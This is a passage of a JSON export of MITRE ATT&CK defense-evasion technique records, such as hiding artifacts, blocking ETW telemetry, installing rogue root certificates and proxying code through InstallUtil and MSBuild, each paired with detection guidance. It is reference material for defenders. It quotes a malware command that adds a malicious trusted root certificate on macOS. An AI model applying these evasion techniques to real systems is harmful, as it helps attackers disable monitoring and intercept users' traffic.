<code>apple.awt.UIElement<\/code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.<\/p>\n<p>Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement<\/code> or any other suspicious plist tag in plist files and flag them.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":619,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":619,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":620,"name":"T1564 - Hide Artifacts","sort_id":0,"external_id":"T1564","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)<\/p>\n<p>Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":620,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":620,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":620,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":623,"name":"T1562 - Impair Defenses","sort_id":0,"external_id":"T1562","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.<\/p>\n<p>Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.\n\nMonitor environment variables and APIs that can be leveraged to disable security measures.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":623,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":624,"name":"T1562.006 - Indicator Blocking","sort_id":0,"external_id":"T1562.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and\/or in the Registry as well as being accessible via administrative utilities such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a>.<\/p>\n<p>ETW interruption can be achieved multiple ways, however most directly by defining conditions using the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> <code>Set-EtwTraceProvider<\/code> cmdlet or by interfacing directly with the Registry to make alterations.<\/p>\n<p>In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and\/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}<\/code>","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":624,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":624,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":624,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":625,"name":"T1027.005 - Indicator Removal from Tools","sort_id":0,"external_id":"T1027.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.<\/p>\n<p>A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":625,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":625,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":625,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":626,"name":"T1553.004 - Install Root Certificate","sort_id":0,"external_id":"T1553.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS\/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.<\/p>\n<p>Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)<\/p>\n<p>Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware\/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS\/SSL communications. (Citation: Kaspersky Superfish)<\/p>\n<p>Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and\/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)<\/p>\n<p>In macOS, the Ay MaMi malware uses <code>\/usr\/bin\/security add-trusted-cert -d -r trustRoot -k \/Library\/Keychains\/System.keychain \/path\/to\/malicious\/cert<\/code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv<\/code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\<\/code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\<\/code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":626,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":626,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":626,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":627,"name":"T1218.004 - InstallUtil","sort_id":0,"external_id":"T1218.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe<\/code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe<\/code>.<\/p>\n<p>InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]<\/code>. (Citation: LOLBAS Installutil)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":627,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":631,"name":"T1036.001 - Invalid Code Signature","sort_id":0,"external_id":"T1036.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)<\/p>\n<p>Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1553\/002\">Code Signing<\/a>, this activity will not result in a valid signature.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":631,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":631,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":649,"name":"T1222.002 - Linux and Mac File and Directory Permissions Modification","sort_id":0,"external_id":"T1222.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify file or directory permissions\/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<\/p>\n<p>Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown<\/code> (short for change owner), and <code>chmod<\/code> (short for change mode).<\/p>\n<p>Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/004\">.bash_profile and .bashrc<\/a> or tainting\/hijacking other instrumental binary\/configuration files via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\">Hijack Execution Flow<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and investigate attempts to modify ACLs and file\/directory ownership. Many of the commands used to modify ACLs and file\/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file\/directory permission change auditing on folders containing key binary\/configuration files.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":649,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":649,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":652,"name":"T1078.003 - Local Accounts","sort_id":0,"external_id":"T1078.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.<\/p>\n<p>Local Accounts may also be abused to elevate privileges and harvest credentials through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":652,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":652,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":652,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":658,"name":"T1127.001 - MSBuild","sort_id":0,"external_id":"T1127.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)<\/p>\n<p>Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file.(Citation: MSDN MSBuild) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":658,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":660,"name":"T1134.003 - Make and Impersonate Token","sort_id":0,"external_id":"T1134.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser<\/code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken<\/code> to assign the token to a thread.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas<\/code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser<\/code> and <code> SetThreadToken<\/code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":660,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":664,"name":"T1036.004 - Masquerade Task or Service","sort_id":0,"external_id":"T1036.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks\/services executed by the Task Scheduler or systemd will typically be given a name and\/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.<\/p>\n<p>Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":664,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":664,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":665,"name":"T1036.005 - Match Legitimate Name or Location","sort_id":0,"external_id":"T1036.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may match or approximate the name or location of legitimate files when naming\/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.<\/p>\n<p>Adversaries may also use the same icon of the file they are trying to mimic.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and\/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":665,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":665,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":665,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":667,"name":"T1578 - Modify Cloud Compute Infrastructure","sort_id":0,"external_id":"T1578","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.<\/p>\n<p>Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":667,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":667,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":667,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":668,"name":"T1218.005 - 